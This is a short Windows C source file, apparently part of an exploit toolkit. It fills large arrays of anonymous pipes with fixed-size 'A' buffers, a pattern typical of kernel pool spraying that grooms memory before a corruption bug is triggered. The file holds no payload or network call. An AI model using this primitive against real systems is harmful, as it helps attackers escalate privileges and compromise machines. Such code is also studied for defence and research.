#include "pipe_utils.h"
#include "windows_api.h"
#include "head.h"

HANDLE ReadPipe[0x40000] = { NULL };
HANDLE WritePipe[0x40000] = { NULL };


BOOL CreatePipeObject(int index) {
	BYTE uBuffer[0x79d0] = { 0 };
	BOOL res = FALSE;
	HANDLE readPipe = NULL;
	HANDLE writePipe = NULL;
	DWORD resultLength;
	RtlFillMemory(uBuffer, sizeof(uBuffer), 0x41);
	if (!CreatePipe(&readPipe, &writePipe, NULL, sizeof(uBuffer))) {
		printf("CreatePipe failed with error %d\n", GetLastError());
		return FALSE;
	}
	if (!WriteFile(writePipe, uBuffer, sizeof(uBuffer), &resultLength, NULL)) {
		printf("WriteFile failed with error %d\n", GetLastError());
		CloseHandle(readPipe);
		CloseHandle(writePipe);
		return FALSE;
	}
	ReadPipe[index] = readPipe;
	WritePipe[index] = writePipe;
	return 1;
}